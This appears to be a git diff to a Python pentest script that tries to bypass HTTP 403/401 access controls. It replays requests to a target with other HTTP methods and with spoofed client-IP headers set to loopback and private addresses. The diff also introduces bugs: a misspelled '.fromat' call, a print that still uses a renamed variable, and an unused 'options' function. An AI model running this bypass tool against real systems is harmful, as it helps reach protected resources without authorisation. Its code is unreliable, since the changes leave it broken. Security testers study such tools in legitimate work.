@@ -10,13 +10,25 @@ BYP = "b"""
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def method(res, url):
+def post(res): req_p = requests.post(res, verify=False, allow_redirects=False); return req_p.status_code, "post"
+def put(res): req_pt = requests.put(res, verify=False, allow_redirects=False); return req_pt.status_code, "put"
+def patch(res): req_ptch = requests.patch(res, verify=False, allow_redirects=False); return req_ptch.status_code, "patch"
+def options(res): req_o = requests.options(res, verify=False, allow_redirects=False); return req_o.status_code, "options"
+
+def method(res):
 	""" 
 	Try other method 
 	Ex: OPTIONS /admin
-	#TODO
 	"""
-	methods = ["POST", "OPTIONS", "PUT", "TRACE", "TRACK", "PATCH"]
+	result_list = []
+	for funct in [post, put, patch]:
+		try:
+			result_list.append(funct(res))
+		except:
+			pass
+	for rs, type_r in result_list:
+		if rs not in [403, 401, 404, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500]:
+			print("{} Forbidden Bypass with this requests type: {}".fromat(BYP, type_r))
 
 
 def original_url(res, page, url):
@@ -52,13 +64,13 @@ def IP_authorization(res, url, domain, page):
 	]
 	try:
 		website_ip = socket.gethostbyname(domain)
-		ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0"]
+		ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0","::1","0:0:0:0:0:0:0:1"]
 	except:
-		ips_type  = ["127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "localhost", "0.0.0.0"]
+		ips_type  = ["127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "localhost", "0.0.0.0","::1","0:0:0:0:0:0:0:1"]
 	for h in headers_type:
 		for ip in ips_type:
-			header = {h : ip}
-			req_ip = requests.get(res, verify=False, headers=header, allow_redirects=False)
+			headers = {h : ip}
+			req_ip = requests.get(res, verify=False, headers=headers, allow_redirects=False)
 			if req_ip.status_code not in [403, 401, 404, 421, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666, 500, 501, 410]:
 				print("{}[{}] {} Forbidden Bypass with: {}".format(BYP, req_ip.status_code, url+page, header))
 
@@ -95,17 +107,17 @@ def bypass_forbidden(res):
 	if req_url.status_code in [403, 401]:
 		original_url(res, page, url)
 		IP_authorization(res, url, domain, page)
-		#method(res, url) #TODO
+		method(res)
 		other_bypass(url, page, req_url)
 	elif len(req_res.content) in range(len(req_url.content) - 50, len(req_url.content) + 50):
 		pass
 	else:
 		original_url(res, page, url)
 		IP_authorization(res, url, domain, page)
-		#method(res, url) #TODO
+		method(res)
 		other_bypass(url, page, req_url)
 
 
 """if __name__ == '__main__':
-	res = "http://challenges2.france-cybersecurity-challenge.fr:5002/api/secret"
+	res = ""
 	bypass_forbidden(res)"""
